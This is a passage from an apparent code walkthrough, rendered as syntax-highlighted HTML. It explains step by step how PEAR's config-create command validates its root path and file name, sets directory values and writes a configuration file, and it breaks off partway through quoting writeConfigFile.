+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">doConfigCreate</span><span class="p">(</span><span class="nv">$command</span><span class="p">,</span> <span class="nv">$options</span><span class="p">,</span> <span class="nv">$params</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nv">$params</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">PEAR</span><span class="o">::</span><span class="na">raiseError</span><span class="p">(</span><span class="s1">&#39;config-create: must have 2 parameters, root path and &#39;</span> <span class="o">.</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;filename to save as&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$root</span> <span class="o">=</span> <span class="nv">$params</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Clean up the DIRECTORY_SEPARATOR mess
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$ds2</span> <span class="o">=</span> <span class="nx">DIRECTORY_SEPARATOR</span> <span class="o">.</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$root</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;!\\\\+!&#39;</span><span class="p">,</span> <span class="s1">&#39;!/+!&#39;</span><span class="p">,</span> <span class="s2">&#34;!</span><span class="si">$ds2</span><span class="s2">+!&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                            <span class="k">array</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                        <span class="nv">$root</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$root</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;/&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;windows&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">PEAR</span><span class="o">::</span><span class="na">raiseError</span><span class="p">(</span><span class="s1">&#39;Root directory must be an absolute path beginning &#39;</span> <span class="o">.</span>
+</span></span><span class="line"><span class="cl">                <span class="s1">&#39;with &#34;/&#34;, was: &#34;&#39;</span> <span class="o">.</span> <span class="nv">$root</span> <span class="o">.</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^[A-Za-z]:/&#39;</span><span class="p">,</span> <span class="nv">$root</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">PEAR</span><span class="o">::</span><span class="na">raiseError</span><span class="p">(</span><span class="s1">&#39;Root directory must be an absolute path beginning &#39;</span> <span class="o">.</span>
+</span></span><span class="line"><span class="cl">                <span class="s1">&#39;with &#34;\\&#34; or &#34;C:\\&#34;, was: &#34;&#39;</span> <span class="o">.</span> <span class="nv">$root</span> <span class="o">.</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$windows</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;windows&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$windows</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$root</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="s1">&#39;\\&#39;</span><span class="p">,</span> <span class="nv">$root</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!@</span><span class="nx">touch</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">PEAR</span><span class="o">::</span><span class="na">raiseError</span><span class="p">(</span><span class="s1">&#39;Could not create &#34;&#39;</span> <span class="o">.</span> <span class="nv">$params</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$params</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">realpath</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$config</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">PEAR_Config</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s1">&#39;#no#system#config#&#39;</span><span class="p">,</span> <span class="k">false</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$root</span><span class="p">[</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$root</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;/&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$root</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$root</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$root</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$config</span><span class="o">-&gt;</span><span class="na">noRegistry</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$config</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;php_dir&#39;</span><span class="p">,</span> <span class="nv">$windows</span> <span class="o">?</span> <span class="s2">&#34;</span><span class="si">$root\\pear\\php</span><span class="s2">&#34;</span> <span class="o">:</span> <span class="s2">&#34;</span><span class="si">$root</span><span class="s2">/pear/php&#34;</span><span class="p">,</span> <span class="s1">&#39;user&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$config</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;data_dir&#39;</span><span class="p">,</span> <span class="nv">$windows</span> <span class="o">?</span> <span class="s2">&#34;</span><span class="si">$root\\pear\\data</span><span class="s2">&#34;</span> <span class="o">:</span> <span class="s2">&#34;</span><span class="si">$root</span><span class="s2">/pear/data&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$config</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;www_dir&#39;</span><span class="p">,</span> <span class="nv">$windows</span> <span class="o">?</span> <span class="s2">&#34;</span><span class="si">$root\\pear\\www</span><span class="s2">&#34;</span> <span class="o">:</span> <span class="s2">&#34;</span><span class="si">$root</span><span class="s2">/pear/www&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$config</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;cfg_dir&#39;</span><span class="p">,</span> <span class="nv">$windows</span> <span class="o">?</span> <span class="s2">&#34;</span><span class="si">$root\\pear\\cfg</span><span class="s2">&#34;</span> <span class="o">:</span> <span class="s2">&#34;</span><span class="si">$root</span><span class="s2">/pear/cfg&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$config</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;ext_dir&#39;</span><span class="p">,</span> <span class="nv">$windows</span> <span class="o">?</span> <span class="s2">&#34;</span><span class="si">$root\\pear\\ext</span><span class="s2">&#34;</span> <span class="o">:</span> <span class="s2">&#34;</span><span class="si">$root</span><span class="s2">/pear/ext&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$config</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;doc_dir&#39;</span><span class="p">,</span> <span class="nv">$windows</span> <span class="o">?</span> <span class="s2">&#34;</span><span class="si">$root\\pear\\docs</span><span class="s2">&#34;</span> <span class="o">:</span> <span class="s2">&#34;</span><span class="si">$root</span><span class="s2">/pear/docs&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$config</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;test_dir&#39;</span><span class="p">,</span> <span class="nv">$windows</span> <span class="o">?</span> <span class="s2">&#34;</span><span class="si">$root\\pear\\tests</span><span class="s2">&#34;</span> <span class="o">:</span> <span class="s2">&#34;</span><span class="si">$root</span><span class="s2">/pear/tests&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$config</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;cache_dir&#39;</span><span class="p">,</span> <span class="nv">$windows</span> <span class="o">?</span> <span class="s2">&#34;</span><span class="si">$root\\pear\\cache</span><span class="s2">&#34;</span> <span class="o">:</span> <span class="s2">&#34;</span><span class="si">$root</span><span class="s2">/pear/cache&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$config</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;download_dir&#39;</span><span class="p">,</span> <span class="nv">$windows</span> <span class="o">?</span> <span class="s2">&#34;</span><span class="si">$root\\pear\\download</span><span class="s2">&#34;</span> <span class="o">:</span> <span class="s2">&#34;</span><span class="si">$root</span><span class="s2">/pear/download&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$config</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;temp_dir&#39;</span><span class="p">,</span> <span class="nv">$windows</span> <span class="o">?</span> <span class="s2">&#34;</span><span class="si">$root\\pear\\temp</span><span class="s2">&#34;</span> <span class="o">:</span> <span class="s2">&#34;</span><span class="si">$root</span><span class="s2">/pear/temp&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$config</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;bin_dir&#39;</span><span class="p">,</span> <span class="nv">$windows</span> <span class="o">?</span> <span class="s2">&#34;</span><span class="si">$root\\pear</span><span class="s2">&#34;</span> <span class="o">:</span> <span class="s2">&#34;</span><span class="si">$root</span><span class="s2">/pear&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$config</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;man_dir&#39;</span><span class="p">,</span> <span class="nv">$windows</span> <span class="o">?</span> <span class="s2">&#34;</span><span class="si">$root\\pear\\man</span><span class="s2">&#34;</span> <span class="o">:</span> <span class="s2">&#34;</span><span class="si">$root</span><span class="s2">/pear/man&#34;</span><span class="p">);</span>
+</span></span><span class="line hl"><span class="cl">    <span class="nv">$config</span><span class="o">-&gt;</span><span class="na">writeConfigFile</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_showConfig</span><span class="p">(</span><span class="nv">$config</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ui</span><span class="o">-&gt;</span><span class="na">outputData</span><span class="p">(</span><span class="s1">&#39;Successfully created default configuration file &#34;&#39;</span> <span class="o">.</span> <span class="nv">$params</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$command</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>The function requires exactly 2 parameters: <code>root path</code> and <code>filename</code>. If not, it errors.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nv">$params</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">PEAR</span><span class="o">::</span><span class="na">raiseError</span><span class="p">(</span><span class="s1">&#39;config-create: must have 2 parameters, root path and &#39;</span> <span class="o">.</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;filename to save as&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$root</span> <span class="o">=</span> <span class="nv">$params</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>If the first character of the root path is not <code>/</code>, the function checks whether the <code>windows</code> option is set.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$root</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;/&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;windows&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">PEAR</span><span class="o">::</span><span class="na">raiseError</span><span class="p">(</span><span class="s1">&#39;Root directory must be an absolute path beginning &#39;</span> <span class="o">.</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;with &#34;/&#34;, was: &#34;&#39;</span> <span class="o">.</span> <span class="nv">$root</span> <span class="o">.</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^[A-Za-z]:/&#39;</span><span class="p">,</span> <span class="nv">$root</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">PEAR</span><span class="o">::</span><span class="na">raiseError</span><span class="p">(</span><span class="s1">&#39;Root directory must be an absolute path beginning &#39;</span> <span class="o">.</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;with &#34;\\&#34; or &#34;C:\\&#34;, was: &#34;&#39;</span> <span class="o">.</span> <span class="nv">$root</span> <span class="o">.</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$windows</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;windows&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$windows</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$root</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="s1">&#39;\\&#39;</span><span class="p">,</span> <span class="nv">$root</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>If not Windows → error because the path must start with <code>/</code>.</li>
+<li>If Windows → verify <code>C:</code> style path and convert <code>/</code> to <code>\</code> if needed.</li>
+</ul>
+<p>Then it attempts to create and validate the output config file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!@</span><span class="nx">touch</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">PEAR</span><span class="o">::</span><span class="na">raiseError</span><span class="p">(</span><span class="s1">&#39;Could not create &#34;&#39;</span> <span class="o">.</span> <span class="nv">$params</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$params</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">realpath</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span></span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>If the file doesn&rsquo;t exist, it attempts <code>touch()</code> to create it. If that fails → error.</li>
+<li>Uses <code>realpath</code> to obtain the absolute path.</li>
+</ul>
+<p>Create a config object and normalize <code>$root</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$config</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">PEAR_Config</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s1">&#39;#no#system#config#&#39;</span><span class="p">,</span> <span class="k">false</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$root</span><span class="p">[</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$root</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;/&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$root</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$root</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$root</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$config</span><span class="o">-&gt;</span><span class="na">noRegistry</span><span class="p">();</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Set directory values:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$config</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;php_dir&#39;</span><span class="p">,</span> <span class="nv">$windows</span> <span class="o">?</span> <span class="s2">&#34;</span><span class="si">$root\\pear\\php</span><span class="s2">&#34;</span> <span class="o">:</span> <span class="s2">&#34;</span><span class="si">$root</span><span class="s2">/pear/php&#34;</span><span class="p">,</span> <span class="s1">&#39;user&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$config</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;data_dir&#39;</span><span class="p">,</span> <span class="nv">$windows</span> <span class="o">?</span> <span class="s2">&#34;</span><span class="si">$root\\pear\\data</span><span class="s2">&#34;</span> <span class="o">:</span> <span class="s2">&#34;</span><span class="si">$root</span><span class="s2">/pear/data&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$config</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;man_dir&#39;</span><span class="p">,</span> <span class="nv">$windows</span> <span class="o">?</span> <span class="s2">&#34;</span><span class="si">$root\\pear\\man</span><span class="s2">&#34;</span> <span class="o">:</span> <span class="s2">&#34;</span><span class="si">$root</span><span class="s2">/pear/man&#34;</span><span class="p">);</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Finally write the configuration file, display it, and report success:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="hl"><span class="lnt">1
+</span></span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line hl"><span class="cl"><span class="nv">$config</span><span class="o">-&gt;</span><span class="na">writeConfigFile</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_showConfig</span><span class="p">(</span><span class="nv">$config</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ui</span><span class="o">-&gt;</span><span class="na">outputData</span><span class="p">(</span><span class="s1">&#39;Successfully created default configuration file &#34;&#39;</span> <span class="o">.</span> <span class="nv">$params</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$command</span><span class="p">);</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>writeConfigFile()</code> is the function responsible for writing the config file.</p>
+<div class="highlight" title="/usr/local/lib/php/PEAR/Command/Config.php"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="hl"><span class="lnt">38
+</span></span><span class="hl"><span class="lnt">39
+</span></span><span class="hl"><span class="lnt">40
+</span></span><span class="hl"><span class="lnt">41
+</span></span><span class="lnt">42
+</span><span class="lnt">43
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">writeConfigFile</span><span class="p">(</span><span class="nv">$file</span> <span class="o">=</span> <span class="k">null</span><span class="p">,</span> <span class="nv">$layer</span> <span class="o">=</span> <span class="s1">&#39;user&#39;</span><span class="p">,</span> <span class="nv">$data</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_lazyChannelSetup</span><span class="p">(</span><span class="nv">$layer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$layer</span> <span class="o">==</span> <span class="s1">&#39;both&#39;</span> <span class="o">||</span> <span class="nv">$layer</span> <span class="o">==</span> <span class="s1">&#39;all&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">files</span> <span class="k">as</span> <span class="nv">$type</span> <span class="o">=&gt;</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$err</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">writeConfigFile</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nv">$type</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">PEAR</span><span class="o">::</span><span class="na">isError</span><span class="p">(</span><span class="nv">$err</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nv">$err</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">files</span><span class="p">[</span><span class="nv">$layer</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">raiseError</span><span class="p">(</span><span class="s2">&#34;unknown config file type `</span><span class="si">$layer</span><span class="s2">&#39;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">===</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">files</span><span class="p">[</span><span class="nv">$layer</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
